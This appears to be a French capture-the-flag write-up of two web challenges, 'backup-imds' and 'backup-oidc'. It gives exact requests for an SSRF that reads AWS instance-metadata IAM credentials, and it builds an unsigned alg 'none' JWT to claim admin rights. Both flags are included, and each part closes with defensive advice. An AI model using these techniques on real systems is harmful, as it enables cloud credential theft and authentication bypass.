# backup-imds (20) & backup-oidc (21) — série cloud (500 chacun)

Deux services « backup-* » du même auteur, chaîne cloud classique. Flag sur le filesystem du
service, « served by no route ».

---

## backup-imds (20) → `NCTF{d8ef5a755ecd3fc83fb4b23b}`
**SSRF → IMDS → assume-role → objet privé**

Endpoints (`GET /`) :
- `/fetch?url=...` : récupère des manifests de backup **côté serveur** (SSRF).
- `/objects/<key>` : objets ; les privés exigent `X-Role-Token`.

Exploitation :
1. La SSRF atteint l'**IMDS AWS** sans filtrage :
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   → `backup-role`.
2. On lit les credentials du rôle :
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role`
   → `{"AccessKeyId":"ASIANCTFBACKUPROLE","Token":"Fwo...","Code":"Success"}`.
3. Le **token de session** EST le jeton de rôle attendu :
   `GET /objects/flag` avec `X-Role-Token: Fwo...` → `{"flag":"NCTF{...}"}`.

> **Leçon :** une SSRF qui atteint `169.254.169.254` = vol des credentials IAM de l'instance.
> Bloquer l'accès à l'IMDS (hop-limit, IMDSv2, allowlist stricte **hôte+IP**).

---

## backup-oidc (21) → `NCTF{dea010e84499df6e317ad60a}`
**JWT `alg=none`**

Endpoints (`GET /`) :
- `/token` → id_token « guest » (JWT HS256, `{"sub":"guest","groups":["users"]}`).
- `/admin/flag` (Authorization: Bearer) → exige `groups` contenant `platform-admin`.

Exploitation : le vérificateur accepte **`alg: "none"`**. On forge un token sans signature :
```json
header  = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","groups":["platform-admin","users"]}
token   = base64url(header) + "." + base64url(payload) + "."
```
`GET /admin/flag` avec `Authorization: Bearer <token>` → `{"flag":"NCTF{...}"}`.

> **Leçon :** toujours **imposer l'algorithme** attendu côté serveur et rejeter `none`.
> Ne jamais faire confiance au champ `alg` du token.
